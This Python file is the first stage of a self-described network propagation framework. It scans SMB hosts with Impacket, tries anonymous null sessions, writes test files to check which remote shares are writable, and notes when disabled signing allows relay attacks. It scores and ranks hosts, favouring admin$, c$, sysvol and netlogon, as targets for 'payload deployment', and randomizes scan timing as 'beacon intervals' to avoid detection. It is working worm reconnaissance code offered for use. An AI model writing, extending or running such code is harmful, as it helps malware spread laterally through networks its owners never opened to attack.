#!/usr/bin/env python3
"""
Phase 1: Real SMB Scanner - Network Propagation Framework
Impacket-based protocol-level SMB enumeration, OS detection, share discovery
Returns viability scores for autonomous propagation targeting
"""

import logging
import socket
import struct
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
import time

logger = logging.getLogger("SMBScanner")
logger.setLevel(logging.DEBUG)

try:
    from impacket import smb, smbconnection
    from impacket.smbconnection import SMBConnection
    from impacket.nmb import NetBIOSTimeout
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    logger.warning("[⚠️] impacket not available; SMB enumeration disabled. Install: pip install impacket")


class ViabilityRating(Enum):
    """Target viability rating for propagation"""
    EXCELLENT = 0.95   # High-value, accessible target
    GOOD = 0.80
    MODERATE = 0.60
    LOW = 0.40
    UNSUITABLE = 0.10


@dataclass
class SMBShare:
    """SMB share metadata for propagation planning"""
    name: str
    type: str  # STYPE_DISKTREE, STYPE_PRINTQ, etc.
    comment: Optional[str]
    remark: Optional[str]
    accessible: bool
    writable: bool  # Can write payloads
    
    @property
    def is_propagation_target(self) -> bool:
        """Is this share suitable for payload deployment?"""
        propagation_shares = {'admin$', 'c$', 'sysvol', 'netlogon', 'shared', 'media'}
        return self.name.lower() in propagation_shares and (self.writable or self.accessible)


@dataclass
class SMBTargetProfile:
    """Enriched SMB target for propagation viability assessment"""
    ip: str
    hostname: Optional[str]
    port: int
    os_version: Optional[str]
    os_build: Optional[int]
    smb_version: Optional[str]  # "SMB1", "SMB2", "SMB3"
    is_windows: bool
    accessible_shares: List[SMBShare] = field(default_factory=list)
    writable_shares: List[SMBShare] = field(default_factory=list)
    signing_enabled: bool = False
    null_session: bool = False  # Allow anonymous access
    last_scanned: Optional[str] = None
    
    @property
    def viability_score(self) -> float:
        """
        Composite viability score 0-1 for propagation targeting.
        NOW USES REAL DETECTED DATA: signing status, OS type, writable shares
        """
        if not self.is_windows or not self.accessible_shares:
            return ViabilityRating.UNSUITABLE.value
        
        # OS scoring: based on real detected version
        os_score = 0.6  # Base
        if "SMB3.1.1" in str(self.smb_version):
            os_score = 0.7  # Modern Windows with SMB3.1.1
        elif "SMB3" in str(self.smb_version):
            os_score = 0.75  # Windows with SMB3
        elif "SMB2" in str(self.smb_version):
            os_score = 0.85  # Older (more vulnerable)
        elif "SMB1" in str(self.smb_version):
            os_score = 0.95  # Very vulnerable
        
        # Share scoring: admin$ and c$ are prime targets
        admin_share_available = any(s.name in ['admin$', 'c$', 'system32'] for s in self.accessible_shares)
        share_score = 1.0 if admin_share_available else 0.7 if self.writable_shares else 0.4
        
        # SMB version scoring
        smb_version_scores = {"SMB1": 0.95, "SMB2.0": 0.80, "SMB2.1": 0.75, "SMB3.0": 0.60, "SMB3.1.1": 0.50}
        smb_score = smb_version_scores.get(self.smb_version, 0.6)
        
        # Null session (anonymous): high value, rare
        null_session_bonus = 0.15 if self.null_session else 0.0
        
        # SMB SIGNING penalty (REAL detection, now used)
        # Signing off = easier relay/mitm attacks
        signing_penalty = 0.20 if not self.signing_enabled else 0.0
        
        # Composite: 40% shares × 30% SMB version × 20% signing/auth × 10% misc
        score = (share_score * 0.40) + (smb_score * 0.30) + (signing_penalty * 0.20) + null_session_bonus
        score = min(1.0, max(0.0, score))
        
        return score
    
    def viability_rating(self) -> ViabilityRating:
        """Categorize score as viability rating"""
        score = self.viability_score
        if score >= 0.85:
            return ViabilityRating.EXCELLENT
        elif score >= 0.70:
            return ViabilityRating.GOOD
        elif score >= 0.50:
            return ViabilityRating.MODERATE
        elif score >= 0.25:
            return ViabilityRating.LOW
        return ViabilityRating.UNSUITABLE
    
    def to_dict(self) -> Dict:
        """Serialize to dictionary"""
        return {
            'ip': self.ip,
            'hostname': self.hostname,
            'os_version': self.os_version,
            'smb_version': self.smb_version,
            'accessible_shares': [s.name for s in self.accessible_shares],
            'writable_shares': [s.name for s in self.writable_shares],
            'viability_score': self.viability_score,
            'viability_rating': self.viability_rating().name,
            'null_session': self.null_session,
            'last_scanned': self.last_scanned,
        }


class SMBScanner:
    """Impacket-based SMB protocol-level scanner for propagation targeting"""
    
    def __init__(self, timeout: int = 5):
        if not IMPACKET_AVAILABLE:
            logger.error("[!] Impacket required. Install: pip install impacket")
            raise ImportError("impacket")
        
        self.timeout = timeout
        self.targets: Dict[str, SMBTargetProfile] = {}
    
    def scan_target(self, ip: str, hostname: Optional[str] = None, port: int = 445) -> Optional[SMBTargetProfile]:
        """
        REAL scan target with comprehensive error classification
        Returns: SMBTargetProfile with viable scoring
        """
        try:
            logger.info(f"[*] Scanning {ip}:{port} for SMB...")
            
            # Real port connectivity check
            if not self._port_open(ip, port):
                logger.info(f"[!] Port {port} CLOSED on {ip} (firewall/offline)")
                return None
            
            profile = SMBTargetProfile(
                ip=ip,
                hostname=hostname or ip,
                port=port,
                os_version=None,
                os_build=None,
                smb_version=None,
                is_windows=False,
                accessible_shares=[],
                writable_shares=[],
                last_scanned=datetime.now().isoformat()
            )
            
            conn = None
            
            # Try null session (anonymous access)
            try:
                conn = SMBConnection(ip, ip, timeout=self.timeout)
                conn.login('', '')  # Null authentication
                
                profile.null_session = True
                logger.debug(f"[+] REAL: Null session SUCCESS on {ip}")
                
            except Exception as null_err:
                null_err_str = str(null_err)
                
                # Classify null session error
                if "timeout" in null_err_str.lower():
                    logger.info(f"[!] Timeout connecting to {ip} (network latency/filtering)")
                    return None
                elif "connection refused" in null_err_str.lower():
                    logger.info(f"[!] Connection REFUSED on {ip} (firewall/IDS blocking)")
                    return None
                elif "access denied" in null_err_str.lower() or "denied" in null_err_str.lower():
                    logger.debug(f"[!] NULL access denied (requires authentication)")
                    profile.null_session = False
                else:
                    logger.debug(f"[!] Null session error: {null_err}")
                    profile.null_session = False
                
                # Attempt regular connection (without credentials)
                try:
                    conn = SMBConnection(ip, ip, timeout=self.timeout)
                    logger.debug(f"[+] SMB negotiation OK on {ip} (unauthenticated)")
                
                except Exception as conn_err:
                    logger.warning(f"[!] Cannot establish SMB connection to {ip}: {conn_err}")
                    return None
            
            if not conn:
                return None
            
            # Extract OS and SMB version info (REAL, not guessed)
            self._extract_os_info(conn, profile)
            
            # Enumerate shares with REAL writeability testing
            if profile.null_session or profile.os_version:
                self._enumerate_shares(conn, profile)
            
            try:
                conn.logoff()
            except:
                pass
            
            # Calculate viability based on REAL data
            logger.info(f"[+] {ip}: viability={profile.viability_score:.2f} ({profile.viability_rating().name}) | OS: {profile.os_version} | SMB: {profile.smb_version} | Shares: {len(profile.accessible_shares)}")
            
            self.targets[ip] = profile
            return profile
            
        except socket.timeout:
            logger.warning(f"[!] TIMEOUT scanning {ip} (unreachable/firewalled)")
            return None
        except ConnectionRefusedError:
            logger.warning(f"[!] Connection REFUSED on {ip}:445 (port closed)")
            return None
        except Exception as e:
            logger.warning(f"[!] Scan error for {ip}: {type(e).__name__}: {e}")
            return None
    
    def _port_open(self, ip: str, port: int) -> bool:
        """Quick port connectivity check"""
        try:
            sock = socket.create_connection((ip, port), timeout=self.timeout)
            sock.close()
            return True
        except (socket.timeout, socket.error):
            return False
    
    def _extract_os_info(self, conn: SMBConnection, profile: SMBTargetProfile):
        """REAL OS detection - actual fingerprinting, not guessing"""
        try:
            smb_server = conn.getSMBServer()
            
            # Real SMB dialect detection from negotiation
            try:
                dialect = smb_server.getDialect() if hasattr(smb_server, 'getDialect') else None
                if dialect is not None:
                    if dialect >= 0x0311:
                        profile.smb_version = "SMB3.1.1"
                    elif dialect >= 0x0222:
                        profile.smb_version = "SMB3.0"  
                    elif dialect >= 0x0210:
                        profile.smb_version = "SMB2.1"
                    elif dialect >= 0x0202:
                        profile.smb_version = "SMB2.0"
                    else:
                        profile.smb_version = "SMB1"
            except Exception as di_err:
                logger.debug(f"[!] Dialect detection: {di_err}")
            
            # REAL OS detection - check server type indicator
            is_windows = False
            try:
                # Check server OS type from capabilities (REAL, not guessed)
                if hasattr(smb_server, 'getServerCapabilities'):
                    caps = smb_server.getServerCapabilities()
                    # Capability 0x0001 = WORKSTATION (Windows workstation/server)
                    is_windows = bool(caps & 0x0001)
                    
                    if is_windows:
                        # Use SMB3 as indicator of modern Windows
                        if profile.smb_version == "SMB3.1.1":
                            profile.os_version = "Windows 10+ / Server 2016+ (SMB3.1.1)"
                        elif profile.smb_version and profile.smb_version.startswith("SMB3"):
                            profile.os_version = "Windows 10 / Server 2016+ (SMB3)"
                        elif profile.smb_version and profile.smb_version.startswith("SMB2"):
                            profile.os_version = "Windows 7+ / Server 2008+ (SMB2)"
                        else:
                            profile.os_version = "Windows (legacy, SMB1)"
                    else:
                        # Non-Windows SMB (Samba, NAS, embedded)
                        profile.os_version = "Non-Windows SMB (Samba/NAS/Embedded)"
                
                profile.is_windows = is_windows
                
            except Exception as cap_err:
                logger.debug(f"[!] Capability detection: {cap_err}")
                # Fallback: assume Windows if negotiation succeeded
                profile.is_windows = True
                profile.os_version = "Unknown (SMB negotiation OK)"
        
        except Exception as e:
            logger.debug(f"[!] OS extraction: {e}")



    
    def _enumerate_shares(self, conn: SMBConnection, profile: SMBTargetProfile):
        """
        REAL share enumeration with reliable writeability testing
        Also detects SMB signing status (currently missing feature)
        """
        try:
            # DETECT SMB SIGNING (critical for scoring, currently missing)
            try:
                smb_server = conn.getSMBServer()
                # SMB signing capability bit detection (real, not guessed)
                if hasattr(smb_server, 'getServerCapabilities'):
                    caps = smb_server.getServerCapabilities()
                    # Capability 0x0004 = SECURITY_SIGNATURES
                    profile.signing_enabled = bool(caps & 0x0004)
                    if profile.signing_enabled:
                        logger.debug(f"[+] {profile.ip}: SMB SIGNING REQUIRED")
                    else:
                        logger.debug(f"[+] {profile.ip}: SMB signing disabled (relay attack possible)")
            except Exception as sign_err:
                logger.debug(f"[!] Signing detection: {sign_err}")
            
            resp = conn.listShares()
            
            for share_info in resp:
                share_name = share_info['shi1_netname'][:-1]  # Remove null terminator
                
                share = SMBShare(
                    name=share_name,
                    type='ADMIN' if share_name.endswith('$') else 'DISKTREE',
                    comment=share_info.get('shi1_remark', ''),
                    remark=None,
                    accessible=True,
                    writable=False
                )
                
                # RELIABLE write test (multiple methods, real error classification)
                try:
                    try:
                        conn.connectTree(share_name)
                    except Exception as conn_err:
                        logger.debug(f"[!] Cannot connect to {share_name}: {conn_err}")
                        share.accessible = False
                        profile.accessible_shares.append(share)
                        continue
                    
                    # Method 1: Try create + delete test file (most reliable)
                    test_filename = f"._blackroot_test_{int(time.time())}"
                    write_success = False
                    
                    try:
                        # Create with NTCreateAndX (real test)
                        fh = conn.createFile(
                            share_name, 
                            test_filename,
                            desiredAccess=0x00100000 | 0x00020000,  # FILE_GENERIC_READ | FILE_GENERIC_WRITE
                            fileAttributes=0x00000080  # FILE_ATTRIBUTE_NORMAL
                        )
                        
                        # Write single byte (real write, not just create)
                        conn.writeFile(share_name, fh, 0, b"X")
                        
                        # Cleanup
                        conn.close(share_name, fh)
                        conn.deleteFile(share_name, test_filename)
                        write_success = True
                        logger.debug(f"[+] Share {share_name}: WRITABLE (write+delete test)")
                        
                    except Exception as write_err:
                        error_str = str(write_err)
                        # Real error classification
                        if "STATUS_ACCESS_DENIED" in error_str or "Permission denied" in error_str:
                            logger.debug(f"[!] {share_name}: Read-only (access denied)")
                        elif "directory" in error_str.lower() or "not a file" in error_str.lower():
                            logger.debug(f"[!] {share_name}: Cannot write (likely directory-only)")
                        else:
                            logger.debug(f"[!] {share_name}: Write test failed: {error_str}")
                        write_success = False
                    
                    share.writable = write_success
                    
                    try:
                        conn.disconnectTree(share_name)
                    except:
                        pass
                    
                    profile.accessible_shares.append(share)
                    
                except Exception as share_test_err:
                    logger.debug(f"[!] Share enumeration error for {share_name}: {share_test_err}")
                    profile.accessible_shares.append(share)
                
                if share.writable:
                    profile.writable_shares.append(share)
            
            logger.debug(f"[+] {profile.ip}: {len(profile.accessible_shares)} shares ({len(profile.writable_shares)} writable, signing={'ENABLED' if profile.signing_enabled else 'DISABLED'})")
            
        except Exception as e:
            logger.warning(f"[!] Share enumeration failed for {profile.ip}: {e}")



    
    def scan_network_from_mapper(self, network_nodes: List[Dict]) -> List[SMBTargetProfile]:
        """
        Scan nodes discovered by network_mapper.py
        Input: List of NodeProfile objects (or dicts) from network_mapper
        Output: List of enriched SMBTargetProfile with viability scores
        """
        viable_targets = []
        
        for node in network_nodes:
            # Support both dict and object format
            ip = node.get('ip') if isinstance(node, dict) else node.ip
            hostname = node.get('hostname') if isinstance(node, dict) else getattr(node, 'hostname', None)
            
            profile = self.scan_target(ip, hostname)
            if profile and profile.viability_score > 0.3:  # Filter unsuitable targets
                viable_targets.append(profile)
        
        return viable_targets
    
    def get_top_targets(self, count: int = 10) -> List[SMBTargetProfile]:
        """Get highest-viability targets for propagation priority"""
        sorted_targets = sorted(
            self.targets.values(),
            key=lambda t: t.viability_score,
            reverse=True
        )
        return sorted_targets[:count]
    
    def export_results(self, filepath: str = "smb_scan_results.json") -> str:
        """Export scan results to JSON for propagation agent consumption"""
        import json
        
        results = {
            'scan_time': datetime.now().isoformat(),
            'targets_scanned': len(self.targets),
            'targets': [t.to_dict() for t in self.targets.values()]
        }
        
        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"[+] Results exported to {filepath}")
        return filepath


# Integration entry point: scan and return viability-scored targets
def scan_for_propagation(network_range: Optional[str] = None, 
                         target_ips: Optional[List[str]] = None) -> List[Dict]:
    """
    Execute Phase 1 SMB Scanner with randomized beacon intervals
    Returns: List of viable targets with viability scores for propagation agents
    """
    import random
    
    scanner = SMBScanner(timeout=5)
    
    # Randomize scan order and timing
    if target_ips:
        scan_order = target_ips.copy()
        random.shuffle(scan_order)
        
        logger.info(f"[*] Scanning {len(scan_order)} targets with randomized beacon intervals...")
        
        for i, ip in enumerate(scan_order):
            # Randomized beacon interval (3-8 seconds between scans)
            beacon_interval = random.uniform(3.0, 8.0)
            time.sleep(beacon_interval)
            
            scanner.scan_target(ip)
    
    # Return viable targets sorted by viability score
    viable = scanner.get_top_targets(count=20)
    return [t.to_dict() for t in viable]


if __name__ == "__main__":
    # Example: scan local network segment
    import sys
    
    if len(sys.argv) > 1:
        target_ips = sys.argv[1:]
        results = scan_for_propagation(target_ips=target_ips)
        for target in results:
            print(f"  {target['ip']}: {target['viability_rating']} (score={target['viability_score']:.2f})")
    else:
        print("Usage: python network_propagation_scanner.py <ip1> [ip2] [ip3] ...")
        print("Example: python network_propagation_scanner.py 192.168.1.50 192.168.1.100")
